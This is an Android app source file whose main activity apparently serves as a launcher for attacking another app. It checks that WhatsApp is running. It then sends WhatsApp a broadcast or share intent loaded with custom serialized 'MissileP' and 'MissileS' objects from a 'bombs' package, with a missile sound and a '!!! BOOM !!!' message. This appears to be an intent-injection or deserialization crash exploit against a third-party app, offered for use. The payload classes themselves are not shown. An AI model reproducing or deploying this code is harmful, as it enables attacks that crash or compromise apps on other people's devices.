package com.jhetox.missileguidedforandroid;

import android.content.Context;
import android.content.Intent;
import android.content.res.AssetFileDescriptor;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Vibrator;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.jhetox.missileguidedforandroid.bombs.MissileP;
import com.jhetox.missileguidedforandroid.bombs.MissileS;
import com.jhetox.missileguidedforandroid.tools.ProcessEnumerator;

public class MainActivity extends AppCompatActivity {

    private static String BROADCAST_TARGET = "android.appwidget.action.APPWIDGET_UPDATE";
    private static String PACKAGE_TARGET = "com.whatsapp";

    private final MediaPlayer mp = new MediaPlayer();
    private Vibrator vibrator = null;

    private void playMissile(){
        if(mp.isPlaying()) mp.stop();

        try {
            mp.reset();
            AssetFileDescriptor afd = getAssets().openFd("missile.mp3");
            mp.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
            mp.prepare();
            mp.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.process_view);

        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);

        Button buttonApplication = (Button)findViewById(R.id.buttonApplication);
        Button buttonBroadcast = (Button)findViewById(R.id.buttonBroadcast);

        buttonApplication.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                initLaunchMissileForApp();
            }
        });

        buttonBroadcast.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                initLaunchMissileForBroadcast();
            }
        });
    }

    private static Intent generateIntent(String action){
        Intent intent = new Intent();
        intent.setPackage(PACKAGE_TARGET);
        intent.setAction(action);
        intent.putExtra("MP", new MissileP());
        intent.putExtra("MS", new MissileS());
        return intent;
    }

    private static void launchIntent(Context context){
        try{
            Intent intent = generateIntent(BROADCAST_TARGET);
            context.sendBroadcast(intent);
        }catch (Exception e){
            Log.e(MainActivity.class.getSimpleName(), e.toString());
            if(context != null) Toast.makeText(context, "!!! ERROR !!! " + e.toString(), Toast.LENGTH_SHORT).show();
        }
    }

    private void initLaunchMissileForBroadcast(){

        boolean isRunningApp = false;
        for(ProcessEnumerator.Process p:ProcessEnumerator.enumerate(this)){
            if(p.getPackageName().contains(PACKAGE_TARGET)){
                isRunningApp = true;
                break;
            }
        }

        if(isRunningApp) {
            playMissile();
            launchIntent(this);
            vibrator.vibrate(200);
        }
        else Toast.makeText(this, "The target " + PACKAGE_TARGET + " is not active", Toast.LENGTH_SHORT).show();
    }

    private void initLaunchMissileForApp(){
        boolean isRunningApp = false;
        for(ProcessEnumerator.Process p:ProcessEnumerator.enumerate(this)){
            if(p.getPackageName().contains(PACKAGE_TARGET)){
                isRunningApp = true;
                break;
            }
        }

        if(isRunningApp) {
            playMissile();
            launchIntentApp(this);
            vibrator.vibrate(200);
        }
        else Toast.makeText(this, "The target " + PACKAGE_TARGET + " is not active", Toast.LENGTH_SHORT).show();
    }

    public static void launchIntentApp(Context context){
        try{
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            intent.setType("text/plain");
            intent.setPackage(PACKAGE_TARGET);
            intent.putExtra("MP", new MissileP());
            intent.putExtra("MS", new MissileS());
            //context.startActivity(intent);
            intent.putExtra(Intent.EXTRA_TEXT, "!!! BOOM !!!");
            context.startActivity(Intent.createChooser(intent, ""));
            Toast.makeText(context, "!!! Missile launched !!!", Toast.LENGTH_SHORT).show();
        }catch (Exception e){
            Log.e(MainActivity.class.getSimpleName(), e.toString());
            if(context != null) Toast.makeText(context, "!!! ERROR !!! " + e.toString(), Toast.LENGTH_SHORT).show();
        }
    }
}